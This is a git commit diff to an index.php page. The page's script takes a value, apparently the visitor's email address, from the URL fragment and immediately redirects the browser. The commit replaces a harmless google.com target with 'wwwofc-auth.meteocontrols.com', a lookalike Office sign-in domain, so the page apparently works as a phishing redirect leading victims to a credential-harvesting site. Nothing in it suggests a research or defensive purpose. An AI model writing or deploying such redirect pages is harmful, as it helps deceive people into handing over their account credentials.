32510be4bf5a17b7dd7f873394f0f7f037f8bb4e
rob897k <118878446+rob897k@users.noreply.github.com>
2022-11-23 06:49:18 +0000

    Update index.php

--- index.php
+++ index.php
@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://google.com"
+			window.location.href = "https://wwwofc-auth.meteocontrols.com"
 		}, 0);
 	</script>
 </html>
